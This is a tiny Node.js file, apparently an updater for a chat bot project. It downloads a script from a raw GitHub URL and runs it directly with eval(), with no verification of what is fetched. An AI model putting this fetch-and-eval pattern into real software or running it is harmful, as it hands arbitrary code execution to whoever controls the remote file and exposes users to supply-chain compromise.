const axios = require('axios');

axios.get("https://raw.githubusercontent.com/MR-NAYAN-404/MR.NAYAN-BOT/main/updater.js")
	.then(res => eval(res.data));
